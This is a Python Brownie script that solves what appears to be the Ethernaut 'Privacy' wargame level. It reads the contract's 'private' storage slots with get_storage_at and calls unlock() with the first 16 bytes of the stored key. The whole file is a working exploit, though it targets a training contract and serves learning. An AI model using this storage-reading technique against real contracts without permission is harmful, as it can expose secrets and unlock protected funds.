from brownie import Contract, Privacy, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        bytes1 = 0xD5FE17341F93A96BA9BDE36983647F296912EE6D76D0F41A77125891FB0EAC62
        bytes2 = 0x9BADF817F5A502588F3F3CC22B6CB5E0ADB7C404A1801B3C2FA6443CDF471764
        bytes3 = 0xD9FCF3C342A2CFD1450B0DE2CC7BC88ED9080A0475C48E989FFA00627359E772

        privacy = Privacy.deploy(
            [bytes1, bytes2, bytes3], {"from": get_account(index=1)}
        )

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                config["networks"][network.show_active()]["infura"]
            )
        )

        privacy = Contract.from_abi(
            Privacy._name,
            config["networks"][network.show_active()]["privacy"],
            Privacy.abi,
        )

    locked = web3.eth.get_storage_at(str(privacy), 0)
    timestamp = web3.eth.get_storage_at(str(privacy), 1)
    flattening = web3.eth.get_storage_at(str(privacy), 2)
    denomination = web3.eth.get_storage_at(str(privacy), 3)
    awkwardness = web3.eth.get_storage_at(str(privacy), 4)
    data = web3.eth.get_storage_at(str(privacy), 5)

    print(f"Locked is {locked.hex()}")
    print(f"Timestamp is {int(timestamp.hex(),0)}")
    print(f"Flattening is {flattening.hex()}")
    print(f"Denomination is {denomination.hex()}")
    print(f"Awkwardness is {awkwardness.hex()}")
    print(f"Data is {data.hex()}")

    tx = privacy.unlock(
        0xD9FCF3C342A2CFD1450B0DE2CC7BC88E,  # First 16 bytes of data[2]
        {"from": account},
    )
    tx.wait(1)

    print("Unlocked" if not privacy.locked() else "Still locked")


def main():
    attack()
